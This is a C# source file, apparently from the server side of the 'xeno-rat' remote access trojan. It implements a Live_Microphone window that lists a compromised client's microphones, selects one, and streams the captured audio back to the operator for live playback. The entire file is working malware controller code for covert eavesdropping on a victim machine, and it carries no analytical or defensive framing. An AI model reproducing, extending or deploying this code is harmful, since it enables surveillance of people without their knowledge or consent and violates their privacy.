using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using NAudio.Wave;

namespace xeno_rat_server.Forms
{
    public partial class Live_Microphone : Form
    {
        Node client;
        Node MicNode;
        AudioPlayer player = new AudioPlayer(new WaveFormat(44100, 16, 2));
        string[] MicroPhones;
        bool playing = false;

        public Live_Microphone(Node _client)
        {
            client = _client;
            InitializeComponent();
            client.AddTempOnDisconnect(TempOnDisconnect);
            InitializeAsync();
        }

        /// <summary>
        /// Initializes the asynchronous task by creating a mic node, adding temporary on disconnect, refreshing microphones, and starting the receive thread.
        /// </summary>
        /// <returns>An asynchronous task representing the initialization process.</returns>
        /// <remarks>
        /// This method initializes the asynchronous task by performing the following steps:
        /// 1. Creates a mic node by awaiting the result of the CreateMicNode method.
        /// 2. Adds temporary on disconnect by invoking the AddTempOnDisconnect method of the mic node.
        /// 3. Refreshes microphones by awaiting the result of the RefreshMics method.
        /// 4. Starts the receive thread by invoking the RecvThread method.
        /// </remarks>
        private async Task InitializeAsync() 
        {
            MicNode = await CreateMicNode();
            MicNode.AddTempOnDisconnect(TempOnDisconnect);
            await RefreshMics();
            RecvThread();
        }

        /// <summary>
        /// Asynchronously receives data from MicNode and adds audio to the player if playing.
        /// </summary>
        /// <remarks>
        /// This method continuously receives data from MicNode while it is connected.
        /// If the received data is null, the method breaks the loop.
        /// If the player is in the playing state, the received audio data is added to the player.
        /// </remarks>
        /// <exception cref="InvalidOperationException">Thrown when the MicNode is not connected.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        public async Task RecvThread()
        {
            while (MicNode.Connected())
            {
                byte[] data = await MicNode.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                if (playing) 
                {
                    player.AddAudio(data);
                }
            }
        }

        /// <summary>
        /// Disconnects the client and microphone node if they match the provided node, and closes the form if it is not disposed.
        /// </summary>
        /// <param name="node">The node to be compared with the client and microphone node.</param>
        /// <remarks>
        /// If the provided <paramref name="node"/> matches the client or the microphone node (if not null), this method disconnects them.
        /// If the form is not disposed, it is closed using a method invocation.
        /// </remarks>
        public void TempOnDisconnect(Node node)
        {
            if (node == client || (node==MicNode && MicNode!=null))
            {
                client?.Disconnect();
                MicNode?.Disconnect();
                if (!this.IsDisposed)
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }

        /// <summary>
        /// Creates a MicNode and returns it. If MicNode already exists, returns the existing MicNode.
        /// </summary>
        /// <returns>The created or existing MicNode.</returns>
        /// <exception cref="Exception">Thrown when an error occurs during the creation of MicNode.</exception>
        private async Task<Node> CreateMicNode()
        {
            if (MicNode != null) 
            {
                return MicNode;
            }
            await client.SendAsync(new byte[] { 5 });
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        /// <summary>
        /// Asynchronously refreshes the list of microphones and updates the UI components accordingly.
        /// </summary>
        /// <remarks>
        /// This method retrieves the list of available microphones using the <see cref="GetMicroPhones"/> method and updates the items in the <see cref="comboBox1"/> accordingly.
        /// If the list of microphones is empty, it disables the <see cref="button2"/>. Otherwise, it enables the button and sets the first microphone using the <see cref="SetMicroPhone"/> method.
        /// </remarks>
        /// <exception cref="Exception">Thrown when an error occurs while retrieving the list of microphones.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        public async Task RefreshMics()
        {
            string[] mics = await GetMicroPhones();

            comboBox1.Items.Clear();
            comboBox1.Items.AddRange(mics);
            if (mics.Length == 0)
            {
                button2.Enabled = false;
            }
            else 
            { 
                button2.Enabled = true;
                await SetMicroPhone(0);
            }
        }

        /// <summary>
        /// Asynchronously retrieves the list of microphones available from the client and returns the result.
        /// </summary>
        /// <returns>An array of strings containing the list of available microphones.</returns>
        /// <remarks>
        /// This method sends an opcode to the client to request the list of microphones, receives the number of microphones available, and then retrieves the names of the microphones one by one.
        /// The retrieved microphone names are stored in an array and assigned to the MicroPhones property of the class.
        /// </remarks>
        public async Task<string[]> GetMicroPhones()
        {
            byte[] opcode = new byte[] { 1 };
            await client.SendAsync(opcode);
            int mics = client.sock.BytesToInt(await client.ReceiveAsync());
            string[] result = new string[mics];
            for (int i = 0; i<mics; i++) 
            {
                result[i]=Encoding.UTF8.GetString(await client.ReceiveAsync());
            }
            MicroPhones = result;
            return result;
        }

        /// <summary>
        /// Sets the microphone using the specified index.
        /// </summary>
        /// <param name="index">The index of the microphone to be set.</param>
        /// <returns>A <see cref="Task"/> representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array opcode with a value of 2 to the client asynchronously using <see cref="client.SendAsync(byte[])"/>.
        /// Then it sends the index converted to bytes to the client asynchronously using <see cref="client.SendAsync(byte[])"/>.
        /// </remarks>
        public async Task SetMicroPhone(int index) 
        {
            byte[] opcode = new byte[] { 2 };
            await client.SendAsync(opcode);
            await client.SendAsync(client.sock.IntToBytes(index));
        }

        /// <summary>
        /// Event handler for the form load event.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        private void Live_Microphone_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Starts the player and sends a signal to the client to start playing.
        /// </summary>
        /// <remarks>
        /// This method enables the start button, disables the stop and pause buttons, starts the player, and sends a signal to the client to start playing.
        /// </remarks>
        private async void button2_Click(object sender, EventArgs e)
        {
            button3.Enabled = true;
            button2.Enabled = false;//start
            button1.Enabled = false;
            player.Start();
            await client.SendAsync(new byte[] { 3 });
            playing = true;

        }

        /// <summary>
        /// Handles the click event for button3, stopping the player and sending a stop signal to the client.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method disables button3 and enables button2 and button1. It stops the player and sends a stop signal to the client using asynchronous communication.
        /// </remarks>
        private async void button3_Click(object sender, EventArgs e)
        {
            button2.Enabled = true;
            button3.Enabled = false;//stop
            button1.Enabled = true;
            player.Stop();
            await client.SendAsync(new byte[] { 4 });
            playing = false;

        }

        /// <summary>
        /// Asynchronously refreshes the microphones and updates the UI.
        /// </summary>
        /// <remarks>
        /// This method triggers the asynchronous refresh of the available microphones and updates the user interface accordingly.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            await RefreshMics();
            //refresh
        }

        /// <summary>
        /// Handles the SelectedIndexChanged event of comboBox1.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method sets the microphone based on the selected index in comboBox1. If the selected index is not -1, it calls the SetMicroPhone method asynchronously and awaits its completion.
        /// </remarks>
        private async void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            int selectedIndex = comboBox1.SelectedIndex;
            if (selectedIndex != -1) 
            {
                await SetMicroPhone(selectedIndex);
            }
        }

        /// <summary>
        /// Releases the unmanaged resources used by the Form and its components when the form is closing.
        /// </summary>
        /// <param name="e">A FormClosingEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method disposes the player object, releasing any unmanaged resources used by the player.
        /// </remarks>
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            player.Dispose();
        }
    }
    class AudioPlayer
    {
        private BufferedWaveProvider waveProvider;
        private WaveOutEvent waveOut;

        public AudioPlayer(WaveFormat waveFormat)
        {
            waveProvider = new BufferedWaveProvider(waveFormat);
            waveOut = new WaveOutEvent();
            waveOut.Init(waveProvider);
        }

        /// <summary>
        /// Clears the buffer and starts playing audio.
        /// </summary>
        /// <remarks>
        /// This method clears the buffer of the wave provider and starts playing audio using the wave out device.
        /// </remarks>
        public void Start()
        {
            waveProvider.ClearBuffer();
            waveOut.Play();
        }

        /// <summary>
        /// Stops the audio playback and clears the buffer.
        /// </summary>
        public void Stop()
        {
            waveOut.Stop();
            waveProvider.ClearBuffer();
        }

        /// <summary>
        /// Stops the audio playback and disposes of the resources used by the WaveOut player.
        /// </summary>
        /// <remarks>
        /// This method stops the audio playback and releases the resources used by the WaveOut player.
        /// </remarks>
        public void Dispose() 
        {
            Stop();
            waveOut.Dispose();
        }

        /// <summary>
        /// Adds audio samples to the wave provider.
        /// </summary>
        /// <param name="audioData">The audio data to be added as byte array.</param>
        /// <remarks>
        /// This method adds the provided audio samples to the wave provider for playback.
        /// </remarks>
        public void AddAudio(byte[] audioData)
        {
            waveProvider.AddSamples(audioData, 0, audioData.Length);
        }
    }
}
